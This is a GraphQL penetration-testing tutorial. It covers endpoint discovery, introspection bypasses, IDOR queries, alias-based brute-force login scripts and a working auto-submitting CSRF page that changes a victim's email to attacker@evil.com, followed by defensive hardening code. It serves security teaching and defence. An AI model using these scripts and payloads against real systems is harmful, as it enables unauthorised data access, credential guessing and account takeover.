# GraphQL API Vulnerabilities

GraphQL's design principles — a self-documenting schema, a single flexible endpoint, and client-defined query shapes — create a fundamentally different attack surface from REST, one where a single misconfigured implementation can expose an entire data graph through one HTTP endpoint. Because all operations share one URL, traditional REST security controls like endpoint-level rate limiting, per-resource firewalls, and method-based access control either don't apply or are trivially bypassed. Introspection, aliases, and query batching turn the protocol's own features into exploitation primitives — meaning an attacker equipped with nothing but Burp Suite can enumerate the full schema, brute-force credentials, and forge state-changing requests before touching a single exploit tool.

**Fundamental principle: GraphQL's single endpoint and self-describing schema mean that any gap in resolver-level authorisation or input validation is reachable by any client that can send a POST request — there is no perimeter between public queries and sensitive mutations, no HTTP method to gate on, and no URL structure to firewall.**

***

## Methodology Overview

Attacking a GraphQL API follows a consistent kill chain. Each phase feeds into the next.

```
GraphQL pentest methodology — high-level flow:
─────────────────────────────────────────────────────────────────────────────
PHASE 1: ENDPOINT DISCOVERY
  ↓  Find the single endpoint (all operations share it)
  ↓  Confirm GraphQL service with universal query {__typename}
  ↓  Try alternate HTTP methods and content types

PHASE 2: SCHEMA DISCOVERY
  ↓  Run introspection query → full type/field/mutation map
  ↓  If introspection blocked → bypass with regex evasion
  ↓  If introspection completely disabled → use suggestion-based
  ↓    reconstruction with Clairvoyance

PHASE 3: ATTACK SURFACE MAPPING
  ↓  Identify queries accepting ID/integer arguments → IDOR candidates
  ↓  Identify mutations touching auth state (email, password, roles)
  ↓  Identify fields marked sensitive (password, token, isAdmin, resetToken)
  ↓  Look for deprecated fields → typically lower auth enforcement
  ↓  Identify injection points (raw string args → resolvers)

PHASE 4: EXPLOITATION
  ├── IDOR:       Query missing/private IDs directly
  ├── Auth bypass: Access admin fields via unprotected resolvers
  ├── Rate limit:  Alias batching for brute force
  ├── CSRF:        Form-based mutation submission cross-origin
  ├── Injection:   SQLi/NoSQLi/CMDi through resolver arguments
  └── DoS:         Deeply nested circular queries

PHASE 5: IMPACT DEMONSTRATION
  ↓  Data exfiltration (users, tokens, admin credentials)
  ↓  Account takeover (email change, password reset token theft)
  ↓  Privilege escalation (isAdmin mutation, createAdmin)
  ↓  Application disruption (destructive mutations, DoS)
─────────────────────────────────────────────────────────────────────────────
```

***

## Phase 1: Endpoint Discovery

GraphQL uses a single endpoint for every operation. Finding it is the mandatory first step.

### Probing Common Paths

```
# ── STEP 1: Common GraphQL endpoint paths to probe ───────────────────────────

/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/graphql/v1
/graphql/console
/query
/gql
/data
/graph

# Append /v1 to any path that returns an HTML error rather than GraphQL error:
/api/v1
/graphql/v1
/api/graphql/v1

# ── STEP 2: Universal query — confirms GraphQL at a path ──────────────────────

# Every GraphQL endpoint exposes __typename on the root type.
# Send this to every path candidate:

POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{"query":"{__typename}"}

# ✓ GraphQL response:
#   {"data":{"__typename":"query"}}

# ✗ Not GraphQL (returns HTML or JSON error unrelated to query parsing):
#   <html>404 Not Found</html>

# ── STEP 3: Recognise non-query errors as GraphQL fingerprints ─────────────────

# If a valid GraphQL endpoint receives garbage input, it responds with:
#   {"errors":[{"message":"Must provide query string."}]}
#   {"errors":[{"message":"query not present"}]}
#   {"errors":[{"message":"400: Bad Request"}]}
#   {"errors":[{"message":"Syntax Error: Expected Name, found }"}]}
#
# These error messages confirm a GraphQL endpoint even BEFORE a valid query
# is accepted. Record the error format — it can leak the GraphQL library/version.

# ── STEP 4: Try alternate HTTP methods ────────────────────────────────────────

# Some endpoints accept GET (useful for CSRF exploitation later):
GET /graphql?query={__typename} HTTP/1.1
Host: target.com

# GET URL-encoded (for WAF evasion or introspection bypass probing):
GET /graphql?query=%7B__typename%7D HTTP/1.1

# POST with form-urlencoded content type (CSRF test / introspection bypass):
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=%7B__typename%7D

# Note: if JSON POST is blocked but GET succeeds → endpoint is CSRF-vulnerable
# if it accepts mutations over GET too.
```

### Initial Reconnaissance

```
# Once the endpoint is confirmed, probe the web interface via Burp's browser:
# 1. Enable Burp intercept
# 2. Navigate the target website normally
# 3. In Proxy → HTTP History, filter by /graphql (or identified path)
# 4. Review real application queries:
#      - What fields are being requested?
#      - What arguments are being passed?
#      - Are there operationName values revealing hidden functionality?
#      - Are queries sent over WebSocket? (subscriptions)
#
# Burp's GraphQL tab parses and pretty-prints captured GraphQL traffic.
# Right-click any captured GraphQL request → "Send to Repeater" for manual testing.

# Also check for:
#   - /graphiql or /graphql/graphiql   (GraphQL IDE, should not be in production)
#   - Apollo Studio / Playground exposed at /studio
#   - Source maps referencing GraphQL query files
#   - JavaScript bundles containing hardcoded query strings
```

***

## Phase 2: Schema Discovery via Introspection

### Probing for Introspection

```json
// ── Minimal introspection probe ───────────────────────────────────────────────
// Send this first to determine if introspection is enabled.

POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__schema{queryType{name}}}"}

// ✓ Enabled response — returns the root query type name:
// {"data":{"__schema":{"queryType":{"name":"Query"}}}}

// ✗ Disabled response — returns an error:
// {"errors":[{"message":"GraphQL introspection is not allowed, but the query
//             contained __schema or __type."}]}
//                                   ↑
//                                   This error message text is the filter target.
//                                   Bypass by breaking the __schema{ pattern.
```

### Full Introspection Query

```graphql
# ── COMPLETE SCHEMA DUMP ──────────────────────────────────────────────────────
# Run this once introspection is confirmed enabled.
# Retrieves all types, fields, arguments, mutations, subscriptions, enums.
#
# NOTE: If this fails, remove the three deprecated directive fields marked below.

query IntrospectionQuery {
    __schema {
        queryType        { name }
        mutationType     { name }
        subscriptionType { name }

        types {
            ...FullType
        }

        directives {
            name
            description
            args { ...InputValue }
            # onOperation    ← DELETE THIS LINE if query fails
            # onFragment     ← DELETE THIS LINE if query fails
            # onField        ← DELETE THIS LINE if query fails
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {    # ← includeDeprecated reveals hidden fields
        name
        description
        args         { ...InputValue }
        type         { ...TypeRef }
        isDeprecated
        deprecationReason
    }
    inputFields  { ...InputValue }
    interfaces   { ...TypeRef }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
    name
    description
    type         { ...TypeRef }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

### Analysing Introspection Results

```json
// ── What to look for in the introspection response ────────────────────────────

// 1. HIGH-VALUE FIELDS ON TYPES — search the response for these strings:
//    "password"        → credentials stored/retrievable
//    "token"           → auth / reset tokens
//    "isAdmin"         → privilege flag
//    "resetToken"      → account takeover primitive
//    "secret"          → generic sensitive field
//    "apiKey"          → credential exposure

// Example suspicious User type:
{
  "name": "User",
  "fields": [
    { "name": "id" },
    { "name": "username" },
    { "name": "email" },
    { "name": "password" },        // ← should never be queryable
    { "name": "isAdmin" },         // ← privilege escalation indicator
    { "name": "resetToken" },      // ← live account takeover vector
    { "name": "createdAt" },
    {
      "name": "oldPassword",       // ← deprecated but still resolves
      "isDeprecated": true,        // ← deprecated fields often have weaker auth
      "deprecationReason": "Use password field instead"
    }
  ]
}

// 2. HIGH-VALUE MUTATIONS — search for destructive or auth-adjacent operations:
{
  "name": "Mutation",
  "fields": [
    { "name": "createProduct" },
    { "name": "deleteUser" },      // ← destructive, test auth enforcement
    { "name": "updateEmail" },     // ← account takeover vector
    { "name": "changePassword" },  // ← account takeover vector
    { "name": "createAdmin" },     // ← privilege escalation
    { "name": "setUserRole" }      // ← privilege escalation
  ]
}

// 3. QUERIES ACCEPTING RAW ID ARGUMENTS — IDOR candidates:
{
  "name": "Query",
  "fields": [
    {
      "name": "getUser",           // ← test: can I query any user ID?
      "args": [{ "name": "id", "type": { "name": "ID" } }]
    },
    {
      "name": "getOrder",          // ← test: can I query another user's orders?
      "args": [{ "name": "id", "type": { "name": "Int" } }]
    }
  ]
}

// Tool tip: paste the raw introspection JSON into GraphQL Voyager
// (http://nathanrandal.com/graphql-visualizer/) to get an interactive
// graph of all type relationships → identifies traversal paths visually.
```

***

## Phase 2a: Bypassing Introspection Defences

When introspection is blocked, defenders typically implement a regex filter. That filter almost always has evasion vectors.

### Regex Bypass Techniques

```
# ── THE PROBLEM ───────────────────────────────────────────────────────────────
# Developer blocks introspection with a naive regex pattern matching: __schema{
#
# GraphQL parser ignores whitespace (spaces, newlines, commas) between tokens.
# The regex does not — so inserting whitespace breaks the match.

# ── BYPASS 1: Newline after __schema ─────────────────────────────────────────

# Regex looks for:   __schema{   ← literal brace immediately after keyword
# Actual query sent: __schema\n{ ← newline inserted between keyword and brace

POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"query{\n__schema\n{queryType{name}}}"}
#                 ↑ \n = URL-encoded newline
#                   GraphQL parser accepts it. Regex rejects only __schema{

# Raw HTTP body (actual bytes sent):
# {"query":"query{__schema
# {queryType{name}}}"}

# ── BYPASS 2: Space between __schema and brace ───────────────────────────────

{"query":"{__schema {queryType{name}}}"}
#                   ↑ space character — breaks __schema{ regex pattern

# ── BYPASS 3: Comma after keyword ─────────────────────────────────────────────

{"query":"{__schema,{queryType{name}}}"}
#                  ↑ commas are whitespace in GraphQL syntax

# ── BYPASS 4: Change HTTP method to GET ──────────────────────────────────────
# Introspection may only be blocked on POST.
# Try sending the query via GET — URL-encode the entire query string.

GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/1.1
Host: target.com

# URL decoded for readability:
# query{__schema
# {queryType{name}}}
#             ↑ %0A = newline

# ── BYPASS 5: POST with x-www-form-urlencoded ─────────────────────────────────
# Introspection filter may only check application/json content type.

POST /graphql HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query=%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

# ── BYPASS DECISION TREE ──────────────────────────────────────────────────────
#
#  Is introspection blocked?
#       ↓ Yes
#  Try newline after __schema → still blocked?
#       ↓ Yes
#  Try space / comma after __schema → still blocked?
#       ↓ Yes
#  Try GET method with URL-encoded query → still blocked?
#       ↓ Yes
#  Try form-urlencoded POST → still blocked?
#       ↓ Yes
#  Full introspection completely disabled → use suggestion-based reconstruction
```

### Schema Reconstruction via Suggestions (Introspection Fully Disabled)

```
# ── THE MECHANISM ─────────────────────────────────────────────────────────────
# Apollo GraphQL server returns "Did you mean X?" suggestions when a
# misspelled field name closely matches an actual field name.
#
# This leaks valid field names without requiring introspection.

# Step 1: Probe a type with a misspelled field
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{ getUser(id:1) { usrnm } }"}

# Apollo response:
# {
#   "errors": [{
#     "message": "Cannot query field \"usrnm\" on type \"User\".
#                 Did you mean \"username\"?"
#   }]
# }
# → "username" is confirmed as a valid field ✓

# Step 2: Continue probing adjacent field names
{"query":"{ getUser(id:1) { passwd } }"}
# → "Did you mean \"password\"?"   → "password" field confirmed ✓

{"query":"{ getUser(id:1) { isAdm } }"}
# → "Did you mean \"isAdmin\"?"    → "isAdmin" field confirmed ✓

{"query":"{ getUser(id:1) { resettok } }"}
# → "Did you mean \"resetToken\"?" → "resetToken" field confirmed ✓


# ── AUTOMATED RECONSTRUCTION WITH CLAIRVOYANCE ────────────────────────────────
# Clairvoyance automates dictionary-based field name probing against
# suggestion responses to reconstruct a near-complete schema.

# Install:
pip install clairvoyance

# Run against target — outputs schema in JSON (compatible with InQL / Voyager):
clairvoyance \
  -u "https://target.com/graphql" \
  -H "Cookie: session=abc123" \
  -o schema.json \
  -w wordlist.txt       # ← common GraphQL field name wordlist

# The output schema.json can be loaded into:
#   - InQL (Burp extension) for query generation
#   - GraphQL Voyager for visual mapping
#   - graphql-path-enum for path enumeration

# Note: Suggestions cannot be directly disabled in Apollo.
# See Apollo GitHub issue #3919 for the community workaround.
```

***

## Phase 3: Exploiting Unsanitised Arguments (IDOR)

When resolvers pass client-supplied arguments directly to data lookups without authorisation checks, an attacker can request any object by manipulating the argument value.

```graphql
# ── SCENARIO: Online shop with delisted products ──────────────────────────────

# Step 1: Query the public product list
query {
    products {
        id
        name
        listed
    }
}

# Response — note sequential IDs with a gap:
# {
#   "data": {
#     "products": [
#       { "id": 1, "name": "Product 1", "listed": true },
#       { "id": 2, "name": "Product 2", "listed": true },
#       { "id": 4, "name": "Product 4", "listed": true }
#       ↑ id 3 is missing — delisted, removed, or secret
#     ]
#   }
# }

# Step 2: Directly query the missing product by ID
query getMissingProduct {
    product(id: 3) {
        id
        name
        description
        listed         # ← "no" — confirms it exists but is hidden
        price
    }
}

# Response — full product details despite it being hidden:
# {
#   "data": {
#     "product": {
#       "id": 3,
#       "name": "Product 3",
#       "listed": "no",
#       "price": 9999
#     }
#   }
# }

# ── SCENARIO: User data access without authorisation ─────────────────────────

# Attacker is authenticated as user id=5.
# Introspection (or suggestions) revealed a getUser(id: ID!) query
# and that User type has: id, username, email, isAdmin, resetToken

# Attacker queries the admin user directly:
query getAdmin {
    getUser(id: 1) {           # ← id 1 = administrator
        id
        username
        email
        isAdmin
        resetToken             # ← live password-reset token
    }
}

# If resolver has no auth check — response exposes all requested fields:
# {
#   "data": {
#     "getUser": {
#       "id": "1",
#       "username": "administrator",
#       "email": "admin@target.com",
#       "isAdmin": true,
#       "resetToken": "a1b2c3d4e5f6"   ← usable for immediate account takeover
#     }
#   }
# }


# ── SCENARIO: Accessing private posts ─────────────────────────────────────────

# Blog platform — posts have a "published" boolean.
# Normal query returns only published posts.

query {
    getBlogSummaries {
        id
        title
        published
    }
}
# Response: ids 1, 2, 4 returned. id 3 missing.

# Attacker queries the private post by ID:
query getPrivatePost {
    getBlogPost(id: 3) {
        id
        title
        content        # ← private draft content
        author { username }
        published      # → false
    }
}
# Response: full draft post including unpublished content


# ── IDOR ENUMERATION SCRIPT ───────────────────────────────────────────────────

import requests, json

ENDPOINT = "https://target.com/graphql"
HEADERS  = {"Content-Type": "application/json", "Cookie": "session=YOUR_SESSION"}

for user_id in range(1, 200):
    payload = {
        "query": f"""
            query {{
                getUser(id: {user_id}) {{
                    id
                    username
                    email
                    isAdmin
                }}
            }}
        """
    }
    r = requests.post(ENDPOINT, headers=HEADERS, json=payload)
    data = r.json().get("data", {}).get("getUser")
    if data:
        flag = " ← ADMIN" if data.get("isAdmin") else ""
        print(f"[+] id={user_id} | {data['username']} | {data['email']}{flag}")
```

***

## Phase 4: Bypassing Rate Limiting via Aliases

Aliases allow multiple resolver invocations to be bundled into a single HTTP request. Rate limiters that count HTTP requests — not operations — are bypassed entirely.

```graphql
# ── HOW ALIASES WORK (LEGITIMATE USE) ────────────────────────────────────────

query getTwoProducts {
    product1: getProduct(id: "1") { id name }    # ← alias: product1
    product2: getProduct(id: "2") { id name }    # ← alias: product2
}

# Without aliases this would fail — two getProduct fields would clash
# With aliases each result is stored under a unique key in the response


# ── ATTACK: Brute force login via aliased mutations ───────────────────────────
#
# Rate limiter counts: 1 HTTP request → allows through
# Server executes:     100 login attempts → rate limiter never triggered

mutation bruteForceLogin {
    login1:   login(input:{username:"carlos",password:"123456"})   {token success}
    login2:   login(input:{username:"carlos",password:"password"}) {token success}
    login3:   login(input:{username:"carlos",password:"letmein"})  {token success}
    login4:   login(input:{username:"carlos",password:"qwerty"})   {token success}
    login5:   login(input:{username:"carlos",password:"monkey"})   {token success}
    login6:   login(input:{username:"carlos",password:"dragon"})   {token success}
    login7:   login(input:{username:"carlos",password:"master"})   {token success}
    login8:   login(input:{username:"carlos",password:"sunshine"}) {token success}
    login9:   login(input:{username:"carlos",password:"princess"}) {token success}
    login10:  login(input:{username:"carlos",password:"welcome"})  {token success}
    # ... up to however many aliases the server's complexity limit allows
}

# Scan the response for "success": true:
# {
#   "data": {
#     "login1":  {"token": null,          "success": false},
#     "login2":  {"token": null,          "success": false},
#     ...
#     "login8":  {"token": "eyJhbG...",   "success": true},  ← valid credential
#     ...
#   }
# }


# ── ATTACK: Discount code enumeration ────────────────────────────────────────

query validateCodes {
    code001: isValidDiscount(code: 1000) { valid amount }
    code002: isValidDiscount(code: 1001) { valid amount }
    code003: isValidDiscount(code: 1002) { valid amount }
    code004: isValidDiscount(code: 1003) { valid amount }
    code005: isValidDiscount(code: 1004) { valid amount }
    # Enumerate entire valid code space in a handful of HTTP requests
}


# ── PAYLOAD GENERATOR: Python script to build aliased brute-force ─────────────

import json, requests

ENDPOINT = "https://target.com/graphql"
HEADERS  = {"Content-Type": "application/json", "Cookie": "session=YOUR_SESSION"}

with open("passwords.txt") as f:
    passwords = [line.strip() for line in f.readlines()[:100]]  # 100 per batch

username = "carlos"

# Build mutation string with one alias per password
aliases = "\n".join(
    f'  login{i}: login(input:{{username:"{username}",password:"{pwd}"}}) '
    f'{{token success}}'
    for i, pwd in enumerate(passwords, 1)
)
mutation = f"mutation {{\n{aliases}\n}}"

response = requests.post(ENDPOINT, headers=HEADERS, json={"query": mutation})
data = response.json().get("data", {})

for alias, result in data.items():
    if result and result.get("success"):
        print(f"[+] Credential found — alias: {alias}")
        print(f"    Token: {result['token']}")
        break
else:
    print("[-] No valid credential in this batch")
```

***

## Phase 5: GraphQL CSRF

GraphQL CSRF arises when an endpoint accepts content types other than `application/json` — specifically `x-www-form-urlencoded` or plain `text/plain` — because browsers can submit those types cross-origin without a CORS preflight.

```
# ── CSRF MECHANICS ────────────────────────────────────────────────────────────
#
# Browser same-origin policy:
#
# application/json    → triggers CORS preflight (OPTIONS request)
#                        Server must return Access-Control-Allow-Origin header
#                        → attacker cannot forge this cross-origin ✓ (safe)
#
# application/x-www-form-urlencoded → "simple request" → no CORS preflight
#                        Browser sends it cross-origin with victim's cookies
#                        → attacker CAN forge this cross-origin ✗ (vulnerable)
#
# text/plain          → also a simple request → same vulnerability

# ── STEP 1: Confirm the endpoint accepts non-JSON content types ───────────────

# Capture a real GraphQL mutation in Burp (e.g. email change mutation)
# Change Content-Type from application/json to application/x-www-form-urlencoded
# Convert the JSON body to URL-encoded format:
#
#   Original JSON body:
#     {"query":"mutation { updateEmail(email: \"test@test.com\") { email } }"}
#
#   URL-encoded equivalent:
#     query=mutation+%7B+updateEmail(email%3A+%22test%40test.com%22)+%7B+email+%7D+%7D
#
# If the server responds with 200 + valid data → endpoint is CSRF-vulnerable

# ── STEP 2: Craft the CSRF exploit ────────────────────────────────────────────

# The exploit page — hosted on attacker's server
# Victim visits this page → their browser sends the mutation with their session cookie
```

```html
<!-- Full CSRF exploit: changes victim's email via GraphQL mutation -->
<html>
  <body>
    <!-- Form action targets the vulnerable GraphQL endpoint -->
    <form id="csrf-form"
          action="https://target.com/graphql"
          method="POST"
          enctype="application/x-www-form-urlencoded">

      <!-- The entire mutation is URL-encoded in a single hidden input -->
      <input type="hidden"
             name="query"
             value="
               mutation {
                 updateEmail(email: &quot;attacker@evil.com&quot;) {
                   id
                   email
                 }
               }
             "/>
    </form>

    <!-- Auto-submit on page load — victim doesn't need to click anything -->
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>

<!--
Attack flow:
─────────────────────────────────────────────────────────────────────────
  Victim (logged in to target.com)
      │
      │ visits https://attacker.com/exploit.html
      │
      ▼
  Browser auto-submits the form to https://target.com/graphql
  (with victim's session cookie attached — same-origin policy allows this
   for simple requests, which form-urlencoded qualifies as)
      │
      ▼
  GraphQL server receives:
    POST /graphql
    Content-Type: application/x-www-form-urlencoded
    Cookie: session=victim_session_token    ← browser attached this
    Body: query=mutation{updateEmail(email:"attacker@evil.com"){id email}}
      │
      ▼
  Server executes mutation as the victim → email changed ✓
  Attacker triggers password reset → reset email arrives at attacker@evil.com
  Attacker resets password → full account takeover ✓
─────────────────────────────────────────────────────────────────────────
-->
```

```
# ── CSRF TESTING CHECKLIST ────────────────────────────────────────────────────

1. Identify a state-changing mutation (updateEmail, changePassword, deleteAccount)
2. Capture it in Burp with original Content-Type: application/json
3. Send to Repeater → change method to GET → does it still execute?
   → Yes → CSRF via GET confirmed
4. Change Content-Type to application/x-www-form-urlencoded
   → Convert body manually or use Burp's "Change body encoding" option
   → Send → does it execute?
   → Yes → CSRF via form-urlencoded confirmed
5. Generate PoC HTML form → upload to exploit server → test against logged-in account
6. Verify: is CSRF token required? Is SameSite cookie attribute set?
```

***

## Defences: Hardening GraphQL in Production

### 1. Disable Introspection and Suggestions

```javascript
// ── Apollo Server v4 ──────────────────────────────────────────────────────────
const { ApolloServer } = require('@apollo/server');
const { NoIntrospection } = require('graphql');

const server = new ApolloServer({
    typeDefs,
    resolvers,

    // ✓ Block introspection in production using built-in validation rule
    validationRules: process.env.NODE_ENV === 'production'
        ? [NoIntrospection]
        : [],

    // ✓ Disable GraphiQL playground in production
    introspection: process.env.NODE_ENV !== 'production',

    // ✓ Never expose stack traces or internal errors to API consumers
    includeStacktraceInErrorResponses: false,

    // ✓ Sanitise error messages before sending to client
    formatError: (formattedError) => {
        if (process.env.NODE_ENV === 'production') {
            // Only pass through client-safe errors; mask everything else
            const safeMessages = ['Not authenticated', 'Not authorised',
                                  'Not found', 'Bad request'];
            const isSafe = safeMessages.some(m =>
                formattedError.message.startsWith(m));
            return isSafe
                ? formattedError
                : { message: 'Internal server error' };
        }
        return formattedError;
    }
});

// ── Disabling Apollo suggestions (workaround — cannot be done via config) ──────

// Apollo does not have a direct config option to disable suggestions.
// The workaround: add a custom plugin that strips suggestion text from errors.

const stripSuggestionsPlugin = {
    requestDidStart() {
        return {
            willSendResponse({ response }) {
                if (response.body.kind === 'single' && response.body.singleResult.errors) {
                    response.body.singleResult.errors =
                        response.body.singleResult.errors.map(err => ({
                            ...err,
                            // ✓ Remove "Did you mean X?" from error messages
                            message: err.message.replace(/Did you mean .+\?/, '').trim()
                        }));
                }
            }
        };
    }
};

const server = new ApolloServer({
    typeDefs, resolvers,
    plugins: [stripSuggestionsPlugin]   // ✓ suggestions suppressed
});
```

### 2. Resolver-Level Authorisation

```javascript
// ── ✗ VULNERABLE: No authorisation on getUser resolver ───────────────────────

const resolvers = {
    Query: {
        getUser: async (_, { id }) => {
            return await db.users.findById(id);   // any caller, any ID
        }
    }
};


// ── ✓ SECURE: Per-resolver auth + ownership enforcement ──────────────────────

const { AuthenticationError, ForbiddenError } = require('apollo-server');

const resolvers = {
    Query: {
        getUser: async (_, { id }, context) => {
            // ✓ Require authentication for every resolver that touches user data
            if (!context.user) {
                throw new AuthenticationError('Must be authenticated');
            }

            // ✓ Users can only access their own record; admins can access any
            if (context.user.id !== id && !context.user.isAdmin) {
                throw new ForbiddenError('Access denied');
            }

            return await db.users.findById(id);
        },

        // ✓ List queries: always filter by calling user's ID
        getOrders: async (_, __, context) => {
            if (!context.user) throw new AuthenticationError('Not authenticated');
            // Return ONLY the calling user's orders — never all orders
            return await db.orders.findByUserId(context.user.id);
        }
    },

    Mutation: {
        updateEmail: async (_, { id, email }, context) => {
            if (!context.user) throw new AuthenticationError('Not authenticated');

            // ✓ Ownership check
            if (context.user.id !== id) {
                throw new ForbiddenError('Cannot modify another user\'s email');
            }

            // ✓ Audit every mutation that touches sensitive data
            await AuditLog.record({
                actor:   context.user.id,
                action:  'UPDATE_EMAIL',
                target:  id,
                newValue: email,
                ip:      context.ip,
                time:    new Date()
            });

            return await db.users.updateEmail(id, email);
        },

        deleteUser: async (_, { id }, context) => {
            // ✓ Admin-only operation
            if (!context.user?.isAdmin) {
                throw new ForbiddenError('Admin role required');
            }
            return await db.users.delete(id);
        }
    }
};


// ── ✓ Schema design: never expose sensitive fields ────────────────────────────

// ✗ BAD — password and resetToken are queryable:
type User {
    id:           ID!
    username:     String!
    email:        String!
    password:     String      # ← REMOVE: should never be a queryable field
    resetToken:   String      # ← REMOVE: live exploit material
    isAdmin:      Boolean!
}

// ✓ GOOD — only expose what clients legitimately need:
type User {
    id:       ID!
    username: String!
    # email intentionally omitted from public-facing type
    # password and resetToken never appear in schema
}
```

### 3. Content-Type Enforcement to Prevent CSRF

```python
# ── Django / graphene-django ──────────────────────────────────────────────────

# ✗ VULNERABLE — CSRF exempted:
from django.views.decorators.csrf import csrf_exempt
urlpatterns = [
    url(r'^graphql', csrf_exempt(GraphQLView.as_view(graphiql=True))),
]

# ✓ SECURE — Keep CSRF middleware active, enforce JSON content type:
from django.views import View
from django.http import JsonResponse
import json

class SecureGraphQLView(GraphQLView):
    def dispatch(self, request, *args, **kwargs):
        # ✓ Only accept application/json
        content_type = request.content_type or ''
        if request.method == 'POST' and 'application/json' not in content_type:
            return JsonResponse(
                {"errors": [{"message": "Unsupported Media Type"}]},
                status=415
            )
        # ✓ Block mutations over GET
        if request.method == 'GET':
            body = request.GET.get('query', '')
            if body.strip().startswith('mutation'):
                return JsonResponse(
                    {"errors": [{"message": "Mutations not allowed over GET"}]},
                    status=405
                )
        return super().dispatch(request, *args, **kwargs)
```

```javascript
// ── Express / Apollo Server content-type enforcement ─────────────────────────

const express = require('express');
const app = express();

// ✓ Middleware: reject non-JSON content types before Apollo sees the request
app.use('/graphql', (req, res, next) => {
    const ct = req.headers['content-type'] || '';

    if (req.method === 'POST' && !ct.includes('application/json')) {
        return res.status(415).json({
            errors: [{ message: 'Content-Type must be application/json' }]
        });
    }

    // ✓ Block GET-based mutations to prevent CSRF via URL parameters
    if (req.method === 'GET') {
        const query = (req.query.query || '').trim();
        if (/^mutation/i.test(query)) {
            return res.status(405).json({
                errors: [{ message: 'Mutations not allowed over GET' }]
            });
        }
    }

    next();
});
```

### 4. Rate Limit by Operation Count, Not HTTP Requests

```javascript
// ── GraphQL Armor — comprehensive protection middleware ───────────────────────

const { ApolloArmor } = require('@escape.tech/graphql-armor');

const armor = new ApolloArmor({
    // ✓ Limit aliases per query — breaks alias brute-force
    maxAliases: {
        enabled: true,
        n: 15              // reject any query with >15 aliases
    },

    // ✓ Limit query nesting depth — prevents circular DoS
    maxDepth: {
        enabled: true,
        n: 6               // reject queries nested deeper than 6 levels
    },

    // ✓ Limit number of directives
    maxDirectives: {
        enabled: true,
        n: 10
    },

    // ✓ Limit total token count per query
    maxTokens: {
        enabled: true,
        n: 1000
    },

    // ✓ Prevent field duplication (basis for some DoS patterns)
    maxFieldDuplication: {
        enabled: true,
        n: 2
    }
});

const { validationRules, plugins } = armor.protect();

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules,
    plugins
});


// ── Manual query depth enforcement ───────────────────────────────────────────

const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
    typeDefs, resolvers,
    validationRules: [
        depthLimit(6),                              // ✓ max nesting depth = 6
        createComplexityLimitRule(500, {            // ✓ max cost per query = 500
            scalarCost: 1,                          //   each scalar field costs 1
            objectCost: 2,                          //   each object type costs 2
            listFactor: 10,                         //   lists multiply cost by 10
            onCost: (cost) => {
                if (cost > 400) {
                    console.warn(`High-cost query: ${cost}`);
                }
            }
        })
    ]
});
```
